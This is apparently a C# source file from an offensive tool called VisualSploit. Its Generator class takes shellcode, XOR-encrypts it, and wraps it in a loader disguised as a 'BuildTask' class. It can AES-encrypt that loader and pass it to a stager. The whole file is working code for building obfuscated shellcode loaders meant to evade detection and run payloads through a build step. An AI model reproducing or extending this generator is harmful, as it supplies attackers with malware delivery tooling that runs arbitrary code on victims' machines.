using VisualSploit.Crypto;
using VisualSploit.Templates;

namespace VisualSploit.Core;

internal record ShellcodePayload(byte[] Data, byte[][] Keys, string Decrypt);

internal static class Generator
{
    public static string Generate(byte[] shellcode, Config cfg)
    {
        var rng = Utils.CreateRng(cfg.Seed);
        var naming = new Naming(cfg.Seed);

        byte[] data;
        byte[][] keys;
        string decrypt;

        if (cfg.Has(Methods.Xor))
        {
            (data, keys) = Xor.Encrypt(shellcode, cfg.XorRounds, cfg.Seed.HasValue ? rng : null);
            decrypt = Xor.Routine(data, keys);
        }
        else
        {
            data = shellcode;
            keys = [];
            decrypt = "";
        }

        if (cfg.Encrypt)
        {
            var parts = Loader.Encrypted(new ShellcodePayload(data, keys, decrypt), cfg, rng, naming);
            var wrapped = $"public static class BuildTask {{ {parts.Declarations} public static void Run() {{ {parts.Body} }} }}";
            return Stager.Generate(Aes.Encrypt(wrapped));
        }

        var code = Loader.Generate(new ShellcodePayload(data, keys, decrypt), cfg, rng, naming);
        return code;
    }
}
